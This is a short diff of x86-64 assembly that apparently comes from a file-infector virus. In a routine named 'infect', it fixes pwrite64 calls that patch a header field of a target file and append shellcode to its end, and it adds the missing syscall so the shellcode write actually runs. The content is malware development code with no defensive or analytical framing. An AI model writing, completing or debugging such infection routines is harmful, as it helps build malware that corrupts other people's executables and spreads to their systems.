@@ -226,12 +226,13 @@ infect:
     mov rax, 0x1000
     mov [rsi + 48], rax
 
+    mov rbx, [fd]   ; If we use [fd] directly the second one won't work
 
     ; Write the changes to the file
     mov rax, 18      ; pwrite64
-    mov rdi, [fd]   
+    mov rdi, rbx 
     mov rsi, buffer
-    mov rdx, [file_size]
+    mov rdx, buffer_len
     xor r10, r10    ; No offset
     syscall
 
@@ -242,10 +243,11 @@ infect:
 
     ; Write the shellcode at the end of the file
     mov rax, 18      ; pwrite64
-    mov rdi, [fd]
+    mov rdi, rbx
     mov rsi, shellcode
     mov rdx, shellcode_len
     mov r10, [file_size]
+    syscall
 
     jmp close
 
